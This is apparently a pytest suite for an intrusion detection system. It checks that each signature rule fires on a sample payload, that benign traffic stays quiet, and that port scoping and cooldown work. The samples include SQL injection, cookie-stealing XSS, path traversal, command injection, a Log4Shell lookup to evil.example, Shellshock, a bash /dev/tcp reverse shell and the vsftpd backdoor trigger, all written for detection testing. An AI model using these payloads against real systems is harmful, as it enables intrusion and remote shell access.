"""Per-signature coverage: every rule in signatures.yaml gets a payload that must
match it (by SID) and the suite guards against benign traffic firing anything.
Records are built directly so no network or scapy build step is involved."""
import yaml
import pytest
from ids.detectors import SignatureDetector
from ids.packet import PacketRecord

RULES = yaml.safe_load(open("rules/signatures.yaml"))["signatures"]


def sids_for(payload: bytes, dport: int = 80, sport: int = 40000, proto: str = "TCP"):
    det = SignatureDetector(rules=RULES)
    rec = PacketRecord(ts=1.0, proto=proto, src_ip="10.0.0.5", dst_ip="10.0.0.9",
                       src_port=sport, dst_port=dport, payload=payload)
    return {a.sid for a in det.inspect(rec)}


# (sid, matching payload, port to send on) — one positive per rule
POSITIVES = [
    (2000001, b"GET /?id=1 UNION SELECT pass FROM users", 80),
    (2000001, b"GET /?id=1%27%20OR%20%271%27=%271", 80),               # url-encoded evasion
    (2000001, b"GET /?id=1/**/UNION/**/SELECT/**/pw/**/FROM/**/u", 80), # comment evasion
    (2000002, b"GET /?q=<script>alert(document.cookie)</script>", 80),
    (2000003, b"GET /../../../../etc/passwd HTTP/1.1", 80),
    (2000004, b"GET /?x=1; cat /etc/passwd HTTP/1.1", 80),
    (2000005, b"X-Api-Version: ${jndi:ldap://evil.example/a}", 8080),
    (2000006, b"User-Agent: () { :;}; /bin/bash -c 'id'", 80),
    (2000007, b"GET /?page=php://input HTTP/1.1", 80),
    (2001001, b"User-Agent: Mozilla/5.00 (Nikto/2.5.0)\r\n", 80),
    (2001002, b"User-Agent: sqlmap/1.7-dev\r\n", 80),
    (2001003, b"User-Agent: gobuster/3.6\r\n", 80),
    (2001004, b"User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)\r\n", 80),
    (2001005, b"User-Agent: Mozilla/4.0 (Hydra)\r\n", 80),
    (2001006, b"session opened: meterpreter over tcp", 4444),
    (2002001, b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 4444),
    (2002002, b"USER administrator\r\n", 21),
    (2002003, b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST", 80),
    (2003001, b"USER backdoor:)\r\n", 21),
    (2003002, b"AB;id > /tmp/x\r\n", 6667),
    (2003003, b"uid=0(root) gid=0(root) groups=0(root)", 1524),
    (2003004, b"root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::", 6200),
]


@pytest.mark.parametrize("sid,payload,port", POSITIVES,
                         ids=[f"{s}-{p}" for s, _, p in POSITIVES])
def test_signature_fires(sid, payload, port):
    assert sid in sids_for(payload, dport=port), f"signature {sid} failed to match"


def test_every_rule_has_a_positive_test():
    covered = {s for s, _, _ in POSITIVES}
    all_sids = {int(r["sid"]) for r in RULES}
    missing = all_sids - covered
    assert not missing, f"rules with no positive test: {sorted(missing)}"


BENIGN = [
    b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    b"GET /products?category=shoes&sort=price_asc HTTP/1.1\r\n",
    b"POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"u\":\"x\"}",
    b"GET /static/app.js HTTP/1.1\r\nAccept: */*\r\n",
]


@pytest.mark.parametrize("payload", BENIGN)
def test_benign_traffic_no_signature(payload):
    assert sids_for(payload, dport=80) == set(), "benign traffic tripped a signature"


def test_port_scoping_respected():
    # SQLi rule is web-port scoped; the same payload on a non-web port must not fire it
    assert 2000001 not in sids_for(b"... UNION SELECT x FROM y ...", dport=9999)


def test_vsftpd_backdoor_only_on_ftp_ports():
    assert 2003001 in sids_for(b"USER evil:)\r\n", dport=21)
    assert 2003001 not in sids_for(b"USER evil:)\r\n", dport=80)


def test_signature_cooldown_dedupes_same_flow():
    det = SignatureDetector(rules=RULES)
    rec = PacketRecord(ts=1.0, proto="TCP", src_ip="10.0.0.5", dst_ip="10.0.0.9",
                       src_port=40000, dst_port=80,
                       payload=b"GET /?q=<script>alert(1)</script>")
    first = list(det.inspect(rec))
    rec.ts = 1.5                       # same flow, within the 5s cooldown
    second = list(det.inspect(rec))
    assert first and not second
